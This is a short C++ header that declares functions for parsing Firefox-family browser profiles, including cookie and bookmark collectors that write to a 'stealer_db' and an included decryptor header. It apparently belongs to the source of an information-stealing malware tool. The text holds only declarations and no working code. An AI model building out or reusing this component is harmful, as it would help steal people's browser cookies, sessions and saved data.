#ifndef GECKOPARSER_H
#define GECKOPARSER_H

#include "includes\DataHolder.h"
#include "includes\DataDump.h"
#include "includes\GeckoDecryptor.h"
#include "includes\Helper.h"

using namespace std::filesystem;
using json = nlohmann::json;

BOOL gecko_parser(std::string username, std::string stealer_db);
BOOL gecko_cookie_collector(std::string username, std::string stealer_db);
std::string get_gecko_program_dir(std::string target_user_data);
BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db);

#endif /* GECKOPARSER_H */